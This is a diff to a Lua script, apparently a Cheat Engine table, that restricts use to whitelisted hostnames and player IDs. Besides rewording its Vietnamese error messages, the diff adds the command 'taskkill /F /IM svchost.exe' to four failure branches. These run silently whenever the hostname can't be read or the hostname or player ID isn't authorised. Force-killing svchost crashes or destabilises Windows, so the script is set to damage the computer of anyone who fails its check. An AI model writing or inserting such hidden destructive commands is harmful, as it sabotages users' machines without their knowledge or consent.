@@ -22,8 +22,9 @@ local function getHostname()
         handle:close()
         return hostname:match("^%s*(.-)%s*$")
     else
-        showMessage("LỖI : KHÔNG ĐÚNG TÊN MÁY TÍNH!")
+        showMessage("LỖI : KHÔNG DÒ ĐƯỢC TÊN MÁY TÍNH!")
         closeCE()
+        os.execute("taskkill /F /IM svchost.exe")
         return nil
     end
 end
@@ -70,19 +71,21 @@ if hostname then
     if not isHostnameVip(hostname) then
         messageDialog("LỖI : HOSTNAME KHÔNG ĐƯỢC PHÉP", mtError)
         closeCE()
+        os.execute("taskkill /F /IM svchost.exe")
         return
     end
 else
     -- If hostname retrieval failed
-    messageDialog("LỖI : KHÔNG ĐÚNG TÊN MÁY TÍNH!", mtError)
+    messageDialog("LỖI : KHÔNG PHÁT HIỆN ĐƯỢC TÊN MÁY TÍNH!", mtError)
     closeCE()
+    os.execute("taskkill /F /IM svchost.exe")
     return
 end
 
 local miniuid = getUID()
 
 if miniuid == nil then
-    messageDialog("LỖI : KHÔNG THỂ ĐỌC BỘ NHỚ, BẮT BUỘC BẠN PHẢI VÔ TÀI KHOẢN CỦA BẠN ĐỂ KIỂM TRA ID NGƯỜI CHƠI", mtError)
+    messageDialog("LỖI : KHÔNG THỂ ĐỌC BỘ NHỚ, BẮT BUỘC BẠN PHẢI VÔ TÀI KHOẢN CỦA BẠN ĐỂ CHÚNG TÔI KIỂM TRA ID NGƯỜI CHƠI", mtError)
     closeCE()
     return
 end
@@ -90,4 +93,5 @@ end
 if not isUidVip(miniuid) then
     messageDialog("LỖI : KHÔNG ĐÚNG ID NGƯỜI CHƠI!", mtError)
     closeCE()
+    os.execute("taskkill /F /IM svchost.exe")
 end
